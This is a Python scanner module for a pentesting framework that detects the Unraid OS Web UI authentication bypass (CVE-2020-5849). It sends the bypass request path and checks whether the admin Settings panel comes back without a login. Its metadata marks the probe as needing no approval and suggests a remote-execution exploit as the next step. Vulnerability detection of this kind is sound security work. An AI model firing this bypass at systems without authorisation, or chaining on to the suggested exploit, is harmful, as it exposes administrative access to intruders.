#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Unraid OS 6.8.0 Web UI authentication bypass (CVE-2020-5849)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Unraid OS - Web UI Auth Bypass Detection (CVE-2020-5849)',
        'description': (
            'Detects CVE-2020-5849 by requesting /webGui/images/green-on.png/Settings and '
            'looking for authenticated Settings panel markers without login.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'unraid', 'auth-bypass', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'scanner/http/cve_2020_5847_detect',
                    'exploits/linux/http/unraid_auth_bypass_exec',
                ],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2020-5849'],
        'cve': 'CVE-2020-5849',
    }

    def run(self):
        path = '/webGui/images/green-on.png/Settings'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        if '"PanelText">Date and Time' in body and '"PanelText">Disk Settings' in body:
            self.set_info(
                severity='critical',
                reason='Unraid Web UI auth bypass (CVE-2020-5849)',
                path=path,
            )
            return True
        return False
